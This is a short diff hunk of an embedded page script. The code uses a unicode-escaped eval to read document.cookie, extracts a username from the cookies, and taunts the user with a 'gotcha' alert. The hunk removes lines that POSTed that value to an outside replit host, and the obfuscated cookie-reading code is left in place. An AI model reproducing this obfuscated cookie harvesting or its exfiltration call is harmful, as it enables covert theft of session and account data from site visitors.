@@ -7,9 +7,6 @@ function check(c) {
 let lol =eval("\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065");
 lol = lol.split(";").filter(check);
 let user = lol[0].trim().split("=")[1];
-const http = new XMLHttpRequest();
-http.open("POST", "https://katara.firestardev.repl.co/chatango?user=" + user);
-http.send();
 
 alert("gotcha, " + user);
 </script>
